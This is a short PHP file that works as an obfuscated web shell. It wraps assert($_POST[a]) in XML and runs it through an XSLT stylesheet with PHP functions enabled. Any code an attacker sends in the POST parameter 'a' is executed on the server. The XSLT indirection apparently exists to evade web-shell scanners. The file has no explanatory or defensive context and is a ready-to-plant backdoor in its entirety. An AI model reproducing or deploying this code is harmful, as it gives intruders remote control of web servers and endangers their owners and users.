<?php
$xml='<root>assert($_POST[a]);</root>';
$xsl='<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:zcg="http://php.net/xsl">
 <xsl:template match="/root">
    <xsl:value-of select="zcg:function(\'assert\',string(.))"/>
 </xsl:template>
</xsl:stylesheet>';
$xmldoc = DOMDocument::loadXML($xml);
$xsldoc = DOMDocument::loadXML($xsl);
$proc = new XSLTProcessor();
$proc->registerPHPFunctions();
$proc->importStyleSheet($xsldoc);
$proc->transformToXML($xmldoc);
?> 
